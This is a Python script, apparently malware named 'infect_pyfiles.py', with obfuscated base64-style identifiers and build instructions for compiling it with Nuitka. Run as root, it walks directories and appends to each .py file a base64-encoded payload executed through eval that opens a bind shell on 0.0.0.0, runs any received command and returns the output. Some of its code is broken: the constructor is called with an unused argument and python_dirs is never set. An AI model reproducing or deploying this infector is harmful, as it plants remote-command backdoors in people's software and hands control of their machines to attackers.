#!/usr/bin/env python3
from os.path import expanduser
from os import walk, environ, getuid
from sys import path
from glob import glob
from platform import system
from re import search
from base64 import b64encode, b64decode
from subprocess import run, PIPE
# pip install -U nuitka
# python3 -m nuitka --follow-imports --standalone infect_pyfiles.py
class eHhjemR5eXB:
    def __init__(self):
        self.bGpqZ2hjen: str = system()
        self.aWFmYXRye: str = "0.0.0.0"
        self.ZmFsa2p0aGM: int = 1025
    def dGVyeXB6Y2FjeH(self, target_file: str):
        YWxmanRob: bytes = b"from socket import socket, AF_INET, SOCK_STREAM"
        YWxmanRob += b"\nfrom subprocess import run, PIPE"
        YWxmanRob += b"\nfrom threading import Thread"
        YWxmanRob += b"\nfrom os import _exit"
        YWxmanRob += b"\ndef serve():"
        YWxmanRob += b"\n\twith socket(AF_INET, SOCK_STREAM) as soc:"
        YWxmanRob += bytes(f"\n\t\tsoc.bind((\"{self.aWFmYXRye}\", {self.ZmFsa2p0aGM}))", "utf-8")
        YWxmanRob += b"\n\t\tsoc.listen(5)"
        YWxmanRob += b"\n\t\tconn, _ = soc.accept()"
        YWxmanRob += b"\n\t\twhile True:"
        YWxmanRob += b"\n\t\t\tcmd = conn.recv(1024).decode(\"utf-8\").strip()"
        YWxmanRob += b"\n\t\t\tcmd_output = run(cmd.split(), stdout=PIPE, stderr=PIPE)"
        YWxmanRob += b"\n\t\t\tif cmd_output.returncode == 0:"
        YWxmanRob += b"\n\t\t\t\tconn.send(bytes(cmd_output.stdout))"
        YWxmanRob += b"\n\t\t\telse: continue"
        YWxmanRob += b"\nt = Thread(target=serve)"
        YWxmanRob += b"\nt.start()"
        YWxmanRob += b"\nt.join()"
        YWxmanRob_base64: bytes = b64encode(YWxmanRob)
        cXBxZXJjYQ = ("\n"*2+"from binascii import a2b_base64\n"+"eval(a2b_base64('{}'))\n".format(YWxmanRob_base64.decode()))
        with open(target_file, "a") as f:
            f.write(cXBxZXJjYQ)
        self.ZmFsa2p0aGM += 1
    def MTRkYmNubWx(self):
        for py_dir in self.python_dirs:
            for Z3Jvb3RhbGZq, _, _ in walk(py_dir):
                YWJyZmFm: chr = "/" if self.bGpqZ2hjen == "Linux" else "\\"
                for file_ in glob(Z3Jvb3RhbGZq+YWJyZmFm+"*.py"):
                    if file_ == Z3Jvb3RhbGZq+YWJyZmFm+__file__: continue
                    self.dGVyeXB6Y2FjeH(file_)
if __name__ == "__main__":
    if getuid() != 0x0:
        print(f"{__file__.split('/')[-1]} must be ran as root...")
        exit(0x0)
    aGdsZGFx = expanduser('~')
    YmNjLGFka2x = eHhjemR5eXB(aGdsZGFx)
    YmNjLGFka2x.MTRkYmNubWx() 
